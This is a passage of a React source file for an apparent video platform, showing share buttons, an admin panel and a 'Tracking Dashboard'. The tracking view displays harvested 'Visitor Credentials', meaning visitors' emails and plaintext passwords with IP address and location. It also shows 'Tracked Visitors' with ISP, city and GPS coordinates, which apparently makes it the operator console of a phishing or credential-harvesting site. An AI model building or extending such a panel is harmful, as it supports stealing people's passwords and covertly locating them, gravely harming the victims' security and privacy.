                                    className="px-2 py-1 bg-sky-500 text-white text-xs rounded hover:bg-sky-600 transition-colors"
                                  >
                                    Twitter
                                  </button>
                                  <button
                                    onClick={() => shareToSocialMedia(image, 'whatsapp')}
                                    className="px-2 py-1 bg-green-600 text-white text-xs rounded hover:bg-green-700 transition-colors"
                                  >
                                    WhatsApp
                                  </button>
                                  <button
                                    onClick={() => shareToSocialMedia(image, 'linkedin')}
                                    className="px-2 py-1 bg-blue-700 text-white text-xs rounded hover:bg-blue-800 transition-colors"
                                  >
                                    LinkedIn
                                  </button>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      );
                    })
                  )}
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Admin Dashboard
  if (currentView === 'admin') {
    return (
      <div className="min-h-screen bg-gray-50">
        {/* Header */}
        <header className="bg-white shadow-sm border-b">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex justify-between items-center h-16">
              <div className="flex items-center">
                <Video className="w-8 h-8 text-blue-600 mr-3" />
                <h1 className="text-xl font-semibold text-gray-900">Admin Dashboard</h1>
              </div>
              <div className="flex items-center space-x-4">
                <div className="flex space-x-2">
                  <button
                    onClick={() => setCurrentView('admin')}
                    className={`px-4 py-2 text-sm font-medium rounded-lg transition-colors ${
                      currentView === 'admin' 
                        ? 'bg-blue-600 text-white' 
                        : 'text-gray-700 hover:bg-gray-100'
                    }`}
                  >
                    Admin Panel
                  </button>
                  <button
                    onClick={() => setCurrentView('tracking')}
                    className={`px-4 py-2 text-sm font-medium rounded-lg transition-colors ${
                      currentView === 'tracking' 
                        ? 'bg-blue-600 text-white' 
                        : 'text-gray-700 hover:bg-gray-100'
                    }`}
                  >
                    Tracking Dashboard
                  </button>
                </div>
                <span className="text-gray-700">Welcome, {currentUser?.username}</span>
                <button
                  onClick={handleLogout}
                  className="flex items-center px-4 py-2 text-sm text-gray-700 hover:text-red-600 transition-colors"
                >
                  <LogOut className="w-4 h-4 mr-2" />
                  Logout
                </button>
              </div>
            </div>
          </div>
        </header>

        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
            {/* Create Creator Form */}
            <div className="lg:col-span-1">
              <div className="bg-white rounded-xl shadow-lg p-6">
                <h2 className="text-lg font-semibold text-gray-900 mb-4">Create New Creator</h2>
                <div className="space-y-4">
                  <div>
                    <input
                      type="text"
                      placeholder="Username"
                      value={creatorForm.username}
                      onChange={(e) => setCreatorForm({...creatorForm, username: e.target.value})}
                      className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                    />
                  </div>
                  <div>
                    <input
                      type="email"
                      placeholder="Email"
                      value={creatorForm.email}
                      onChange={(e) => setCreatorForm({...creatorForm, email: e.target.value})}
                      className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                    />
                  </div>
                  <div>
                    <input
                      type="password"
                      placeholder="Password"
                      value={creatorForm.password}
                      onChange={(e) => setCreatorForm({...creatorForm, password: e.target.value})}
                      className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                    />
                  </div>
                  <button
                    onClick={handleCreateCreator}
                    disabled={loading}
                    className="w-full bg-blue-600 text-white py-2 rounded-lg font-medium hover:bg-blue-700 transition-colors disabled:opacity-50 flex items-center justify-center"
                  >
                    <Plus className="w-4 h-4 mr-2" />
                    {loading ? 'Creating...' : 'Create Creator'}
                  </button>
                </div>
              </div>

              {/* Creators List */}
              <div className="bg-white rounded-xl shadow-lg p-6 mt-6">
                <h2 className="text-lg font-semibold text-gray-900 mb-4">All Creators</h2>
                <div className="space-y-3 max-h-64 overflow-y-auto">
                  {creators.length === 0 ? (
                    <div className="text-center text-gray-500 py-4">
                      <Users className="mx-auto w-8 h-8 mb-2 opacity-50" />
                      <p>No creators found</p>
                    </div>
                  ) : (
                    creators.map((creator) => (
                      <div key={creator.id} className="flex justify-between items-center p-3 border border-gray-200 rounded-lg">
                        <div>
                          <p className="font-medium text-gray-900">{creator.username}</p>
                          <p className="text-sm text-gray-600">{creator.email}</p>
                        </div>
                        <span className="px-2 py-1 bg-green-100 text-green-800 text-xs rounded-full">
                          Creator
                        </span>
                      </div>
                    ))
                  )}
                </div>
              </div>
            </div>

            {/* Face Users Data */}
            <div className="lg:col-span-2 bg-white rounded-xl shadow-lg p-6">
              <div className="flex justify-between items-center mb-4">
                <h2 className="text-lg font-semibold text-gray-900">Face Users Data</h2>
                <button
                  onClick={fetchFaceUsers}
                  className="px-4 py-2 bg-blue-600 text-white rounded-lg text-sm hover:bg-blue-700 transition-colors"
                >
                  Refresh Data
                </button>
              </div>
              {faceUsers.length === 0 ? (
                <div className="text-center text-gray-500 py-8">
                  <Users className="mx-auto w-12 h-12 mb-4 opacity-50" />
                  <p>No face users data found</p>
                </div>
              ) : (
                <div className="overflow-x-auto">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="border-b border-gray-200">
                        <th className="text-left py-2 px-3">ID</th>
                        <th className="text-left py-2 px-3">Email</th>
                        <th className="text-left py-2 px-3">Date Joined</th>
                      </tr>
                    </thead>
                    <tbody>
                      {faceUsers.map((user) => (
                        <tr key={user.id} className="border-b border-gray-100 hover:bg-gray-50">
                          <td className="py-2 px-3">{user.id}</td>
                          <td className="py-2 px-3">{user.email || 'N/A'}</td>
                          <td className="py-2 px-3">
                            {user.date_joined ? new Date(user.date_joined).toLocaleDateString() : 'N/A'}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Tracking Dashboard
  if (currentView === 'tracking') {
    return (
      <div className="min-h-screen bg-gray-50">
        {/* Header */}
        <header className="bg-white shadow-sm border-b">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex justify-between items-center h-16">
              <div className="flex items-center">
                <UserCheck className="w-8 h-8 text-blue-600 mr-3" />
                <h1 className="text-xl font-semibold text-gray-900">Tracking Dashboard</h1>
              </div>
              <div className="flex items-center space-x-4">
                <div className="flex space-x-2">
                  <button
                    onClick={() => setCurrentView('admin')}
                    className={`px-4 py-2 text-sm font-medium rounded-lg transition-colors ${
                      currentView === 'admin' 
                        ? 'bg-blue-600 text-white' 
                        : 'text-gray-700 hover:bg-gray-100'
                    }`}
                  >
                    Admin Panel
                  </button>
                  <button
                    onClick={() => setCurrentView('tracking')}
                    className={`px-4 py-2 text-sm font-medium rounded-lg transition-colors ${
                      currentView === 'tracking' 
                        ? 'bg-blue-600 text-white' 
                        : 'text-gray-700 hover:bg-gray-100'
                    }`}
                  >
                    Tracking Dashboard
                  </button>
                </div>
                <span className="text-gray-700">Welcome, {currentUser?.username}</span>
                <button
                  onClick={handleLogout}
                  className="flex items-center px-4 py-2 text-sm text-gray-700 hover:text-red-600 transition-colors"
                >
                  <LogOut className="w-4 h-4 mr-2" />
                  Logout
                </button>
              </div>
            </div>
          </div>
        </header>

        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
          {/* Tab Navigation */}
          <div className="flex mb-6 bg-white rounded-lg p-1 shadow-sm">
            <button
              onClick={() => setActiveTab('credentials')}
              className={`flex-1 py-3 px-4 rounded-md text-sm font-medium transition-all ${
                activeTab === 'credentials' 
                  ? 'bg-blue-600 text-white shadow-md' 
                  : 'text-gray-600 hover:text-gray-900'
              }`}
            >
              <AlertCircle className="w-4 h-4 inline mr-2" />
              Visitor Credentials
            </button>
            <button
              onClick={() => setActiveTab('visitors')}
              className={`flex-1 py-3 px-4 rounded-md text-sm font-medium transition-all ${
                activeTab === 'visitors' 
                  ? 'bg-blue-600 text-white shadow-md' 
                  : 'text-gray-600 hover:text-gray-900'
              }`}
            >
              <MapPin className="w-4 h-4 inline mr-2" />
              Tracked Visitors
            </button>
          </div>

          {/* Credentials Tab */}
          {activeTab === 'credentials' && (
            <div className="bg-white rounded-xl shadow-lg p-6">
              <div className="flex justify-between items-center mb-6">
                <h2 className="text-lg font-semibold text-gray-900">Visitor Credentials</h2>
                <button
                  onClick={fetchVisitorCredentials}
                  className="px-4 py-2 bg-blue-600 text-white rounded-lg text-sm hover:bg-blue-700 transition-colors flex items-center"
                >
                  <RefreshCw className="w-4 h-4 mr-2" />
                  Refresh
                </button>
              </div>
              
              {visitorCredentials.length === 0 ? (
                <div className="text-center text-gray-500 py-8">
                  <AlertCircle className="mx-auto w-12 h-12 mb-4 opacity-50" />
                  <p>No credentials data found</p>
                </div>
              ) : (
                <div className="overflow-x-auto">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="border-b border-gray-200">
                        <th className="text-left py-3 px-4">Email</th>
                        <th className="text-left py-3 px-4">Password</th>
                        <th className="text-left py-3 px-4">IP Address</th>
                        <th className="text-left py-3 px-4">Country</th>
                        <th className="text-left py-3 px-4">Region</th>
                        <th className="text-left py-3 px-4">Timestamp</th>
                      </tr>
                    </thead>
                    <tbody>
                      {visitorCredentials.map((credential) => (
                        <tr key={credential.id} className="border-b border-gray-100 hover:bg-red-50">
                          <td className="py-3 px-4 font-medium text-gray-900">{credential.email}</td>
                          <td className="py-3 px-4 font-mono text-sm bg-gray-100 rounded">
                            {credential.password}
                          </td>
                          <td className="py-3 px-4">
                            <span className="bg-blue-100 text-blue-800 px-2 py-1 rounded text-xs">
                              {credential.ip_address}
                            </span>
                          </td>
                          <td className="py-3 px-4">
                            <div className="flex items-center">
                              <Globe className="w-4 h-4 mr-2 text-gray-400" />
                              {credential.country}
                            </div>
                          </td>
                          <td className="py-3 px-4">{credential.region}</td>
                          <td className="py-3 px-4 text-gray-500 text-xs">
                            {new Date(credential.timestamp).toLocaleString()}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </div>
          )}

          {/* Visitors Tab */}
          {activeTab === 'visitors' && (
            <div className="bg-white rounded-xl shadow-lg p-6">
              <div className="flex justify-between items-center mb-6">
                <h2 className="text-lg font-semibold text-gray-900">Tracked Visitors</h2>
                <button
                  onClick={fetchTrackedVisitors}
                  className="px-4 py-2 bg-blue-600 text-white rounded-lg text-sm hover:bg-blue-700 transition-colors flex items-center"
                >
                  <RefreshCw className="w-4 h-4 mr-2" />
                  Refresh
                </button>
              </div>
              
              {trackedVisitors.length === 0 ? (
                <div className="text-center text-gray-500 py-8">
                  <MapPin className="mx-auto w-12 h-12 mb-4 opacity-50" />
                  <p>No visitor tracking data found</p>
                </div>
              ) : (
                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                  {trackedVisitors.map((visitor) => (
                    <div key={visitor.id} className="border border-gray-200 rounded-lg p-4 hover:shadow-md transition-shadow">
                      <div className="flex justify-between items-start mb-3">
                        <div>
                          <h3 className="font-semibold text-gray-900">{visitor.ip_address}</h3>
                          <p className="text-sm text-gray-600">{visitor.isp}</p>
                        </div>
                        <span className="bg-green-100 text-green-800 px-2 py-1 rounded text-xs">
                          Active
                        </span>
                      </div>
                      
                      <div className="grid grid-cols-2 gap-4 text-sm">
                        <div>
                          <span className="font-medium text-gray-600">Location:</span>
                          <p>{visitor.city}, {visitor.region}, {visitor.country}</p>
                        </div>
                        <div>
                          <span className="font-medium text-gray-600">Coordinates:</span>
                          <p>{visitor.latitude}, {visitor.longitude}</p>
                        </div>
                        <div>
                          <span className="font-medium text-gray-600">Pages Visited:</span>
                          <p>{visitor.pages_visited}</p>
                        </div>
                        <div>
                          <span className="font-medium text-gray-600">Time Spent:</span>
                          <p>{visitor.time_spent}</p>
                        </div>
                      </div>
                      
                      <div className="mt-3 pt-3 border-t border-gray-100">
                        <p className="text-xs text-gray-500">
                          Last activity: {new Date(visitor.timestamp).toLocaleString()}
                        </p>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    );
  }

  return null;
};

export default VideoPlatformApp;